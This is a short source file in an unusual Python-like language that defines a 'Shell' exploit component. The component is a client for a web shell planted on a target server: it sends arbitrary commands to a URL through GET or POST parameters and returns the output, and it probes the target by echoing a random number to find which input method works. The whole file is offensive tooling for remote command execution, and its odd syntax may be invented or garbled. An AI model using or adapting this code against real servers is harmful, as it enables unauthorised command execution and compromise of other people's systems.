from('random', 'randint');

class init ExploitComponent Shell {
    __init__: @(createUrl, createPost = null) { },
    
    run: @(cmd) {        
        u = self.createUrl(cmd);
        p = self.createPost != null ? self.createPost(cmd) : null;
        resp = Http.request(u, p);        
        ret resp;
	},

    static get: @(url)
        Shell(@(cmd) url + '?' + urllib.urlencode({cmd})),
            
    static post: @(url)
        Shell(
            @(cmd) url,
            @(cmd) urllib.urlencode({cmd})),
            
    static open: @(url) {
        Shell.log('[i] Detecting shell input');
        probe = randint(0x10000000, 0xFFFFFFFF) |> str;
        probeCmd = 'echo %s' % probe;
        
        for (f in [Shell.post, Shell.get]) {
            try {
                shell = f(url);
                result = shell.run(probeCmd);
                
                if (result.__contains__(probe)) {
                    Shell.log('[+] Shell input found');                
                    ret shell;
                }
            } catch(e) {
                Shell.log('[x] Request failed: %s' % e);
            }
        }
        
        Shell.log('[x] Could not find shell input');        
        ret null;
    },
};